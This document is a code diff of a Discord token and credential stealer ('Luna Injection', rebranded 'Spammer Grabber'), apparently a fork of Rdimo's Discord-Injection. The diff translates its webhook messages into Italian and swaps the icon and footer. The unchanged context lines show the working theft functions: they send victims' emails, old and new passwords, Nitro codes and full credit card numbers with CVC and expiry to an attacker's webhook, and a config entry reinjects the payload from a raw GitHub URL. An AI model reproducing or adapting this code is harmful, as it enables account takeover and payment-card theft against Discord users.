@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Luna Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://cdn.discordapp.com/attachments/1054005788403830834/1055138414648901693/avatar.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/PeppinUCocchet/Cool/main/injection.js', //injection url for when it reinjects
   /**
@@ -660,13 +660,13 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
+            name: '**Info Account**',
             value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Info Discord**',
+            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nPagamenti: **${billing}**`,
             inline: false,
           },
           {
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Spammer Grabber ON TOP spammerone#3928',
         },
       },
     ],
@@ -702,13 +702,13 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            name: '**Password Cambiata**',
+            value: `Email: **${json.email}**\nVecchia Password: **${oldpassword}**\nNuova Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nPagamenti: **${billing}**`,
             inline: true,
           },
           {
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Spammer Grabber ON TOP spammerone#3928',
         },
       },
     ],
@@ -744,13 +744,13 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            name: '**Email Cambiata**',
+            value: `Nuova Email: **${email}**\nPassword: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nPagamenti: **${billing}**`,
             inline: true,
           },
           {
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Spammer Grabber ON TOP spammerone#3928',
         },
       },
     ],
@@ -786,13 +786,13 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            name: '**Paypal Aggiunta**',
+            value: `Tempo di comprare nitro amore mio 😩`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Tipo Nitro: **${nitro}*\nBadges: **${badges}**\nPagamenti: **${billing}**`,
             inline: false,
           },
           {
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Spammer Grabber ON TOP spammerone#3928',
         },
       },
     ],
@@ -828,13 +828,13 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            name: '**Carta di Credito Aggiunta**',
+            value: `Numero della Carta di Credito: **${number}**\nCVC: **${cvc}**\nData di Scadenza: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nPagamenti: **${billing}**`,
             inline: true,
           },
           {
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Spammer Grabber ON TOP spammerone#3928',
         },
       },
     ],
@@ -872,13 +872,13 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            name: '**Nitro Comprato!**',
+            value: `**Codice Nitro:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nPagamenti: **${billing}**`,
             inline: true,
           },
           {
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Spammer Grabber ON TOP spammerone#3928',
         },
       },
     ],
